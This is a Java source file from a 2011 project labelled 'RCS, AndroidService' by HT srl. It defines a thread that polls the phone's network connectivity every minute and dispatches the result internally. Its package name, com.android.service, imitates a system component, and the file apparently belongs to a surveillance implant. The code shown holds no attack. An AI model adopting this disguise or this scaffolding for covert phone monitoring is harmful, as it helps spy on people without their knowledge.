/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorConnectivity.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.listener;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.android.service.Connectivity;
import com.android.service.Status;
import com.android.service.conf.Configuration;

// Falso broadcast, e' generato da noi
public class BroadcastMonitorConnectivity extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorConnectivity";

	private boolean stop;
	private int period;

	public BroadcastMonitorConnectivity() {
		stop = false;
		period = 60000; // Poll interval
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			ConnectivityManager connectivityManager = (ConnectivityManager) Status.getAppContext().getSystemService(
					Context.CONNECTIVITY_SERVICE);

			NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();

			if (activeNetworkInfo != null)
				onReceive(activeNetworkInfo.isConnected());
			else
				onReceive(false);
			
			try {
				wait(period);
			} catch (InterruptedException e) {
				if(Configuration.isDebug()) { e.printStackTrace(); }
			}
		} while (true);
	}

	public void onReceive(boolean isConnected) {
		ListenerConnectivity.self().dispatch(new Connectivity(isConnected));
	}

	void register() {
		stop = false;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
